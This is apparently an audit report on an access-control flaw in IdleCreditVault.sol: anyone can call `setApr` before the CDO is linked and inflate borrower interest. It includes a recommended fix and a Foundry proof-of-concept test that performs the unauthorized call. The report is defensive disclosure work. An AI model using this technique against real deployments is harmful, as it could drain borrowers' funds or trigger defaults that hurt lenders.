### Title
Unauthenticated pre-link APR overwrite inflates borrower debt and LP claims - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.setApr` skips caller validation whenever `idleCDO == address(0)`, allowing any EOA to overwrite the fixed APR during the deployment window after vault initialization and before `setWhitelistedCDO` links the CDO. [1](#0-0) 

### Finding Description
The intended authorization model permits only the configured CDO or manager to update `lastApr`. The guard is bypassed while `idleCDO` is unset, so an attacker can send `setApr(20e18)` and set the scaled APR to the default 20% cap. [1](#0-0)  Once `setWhitelistedCDO` records the CDO, the forged value remains active without needing another privileged write. [2](#0-1) 

`startEpoch` prices borrower obligations from `_getStrategyApr()`, which reads this forged `lastApr`. [3](#0-2)  The resulting `expectedEpochInterest` is pulled from the borrower during `stopEpoch` and distributed through normal tranche accounting. [4](#0-3) [5](#0-4) 

An attacker who is a KYC-approved lender can therefore acquire tranches at the unaltered pre-attack price, wait for the forged epoch yield to be paid, and receive a pro-rata share of the excess borrower payment. For example, changing an intended 5% APR to the 20% cap over a 30-day epoch creates excess debt of approximately:

```text
TVL * 15% * 30 / 365
```

For 10,000,000 underlying units, that is approximately 123,287 underlying units of excess epoch obligation before fees.

### Impact Explanation
The broken invariant is authorization over borrower-facing pool configuration: an unauthenticated transaction permanently changes the rate used to calculate `expectedEpochInterest`. If the honest borrower honors the inflated obligation, the excess is paid into the CDO and distributed as yield; an attacker controlling a material share of LP principal directly receives a corresponding share of that transfer. If the borrower refuses, the attempted pull can route into `_handleBorrowerDefault`, causing loss finalization or frozen claims. [6](#0-5) 

The `maxApr` guard does not prevent this; it only caps the forged value at 20%, which can still substantially exceed the intended APR. [7](#0-6) 

### Likelihood Explanation
Likelihood is limited to a deployment/setup transaction race: the attack must occur after strategy initialization and before `setWhitelistedCDO` makes the authorization check active. It does not require privileged access or a malicious borrower, and public mempool sequencing can expose the necessary window. On an already linked production vault, the same call reverts because `msg.sender` is neither the CDO nor manager.

### Recommendation
Require `msg.sender == manager` even when `idleCDO` is unset, or initialize and authorize the CDO atomically before accepting any APR mutation. Explicitly:

```solidity
address _cdo = idleCDO;
if (msg.sender != manager && (_cdo == address(0) || msg.sender != _cdo)) {
  revert NotAllowed();
}
```

Alternatively, store a one-time `aprConfigured` flag and permit initialization only from the deployer/manager, then remove the `idleCDO == address(0)` authorization bypass entirely.

### Proof of Concept
The following Foundry fork test demonstrates the forged APR surviving the later CDO link and inflating the first epoch liability.

```solidity
// test/foundry/PreLinkAprPush.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVault} from "../../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";

contract PreLinkAprPushTest is Test {
    uint256 internal constant INTENDED_APR = 5e18;
    uint256 internal constant FORGED_APR = 20e18;
    uint256 internal constant TVL = 10_000_000e6;
    uint256 internal constant EPOCH_DURATION = 30 days;

    IdleCreditVault internal strategy;
    IERC20Detailed internal underlying;
    address internal owner = makeAddr("owner");
    address internal manager = makeAddr("manager");
    address internal borrower = makeAddr("borrower");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
        underlying = IERC20Detailed(vm.envAddress("UNDERLYING"));

        // Deploy through the normal proxy/deployment path, or use a test proxy
        // matching production initialization semantics.
        strategy = new IdleCreditVault();
        vm.prank(owner);
        strategy.initialize(
            address(underlying),
            owner,
            manager,
            borrower,
            "Borrower",
            INTENDED_APR
        );
    }

    function testAttackerCanPushAprBeforeCdoLink() public {
        assertEq(strategy.idleCDO(), address(0));
        assertEq(strategy.getApr(), INTENDED_APR);

        vm.prank(attacker);
        strategy.setApr(FORGED_APR);

        assertEq(strategy.getApr(), FORGED_APR);

        address cdo = makeAddr("cdo");
        vm.prank(owner);
        strategy.setWhitelistedCDO(cdo);

        // Linking does not repair the forged value.
        assertEq(strategy.getApr(), FORGED_APR);

        uint256 intendedInterest =
            TVL * (INTENDED_APR / 100) * EPOCH_DURATION / (365 days * 1e18);
        uint256 forgedInterest =
            TVL * (FORGED_APR / 100) * EPOCH_DURATION / (365 days * 1e18);

        assertEq(forgedInterest - intendedInterest, 123_287_671_232);
    }
}
```
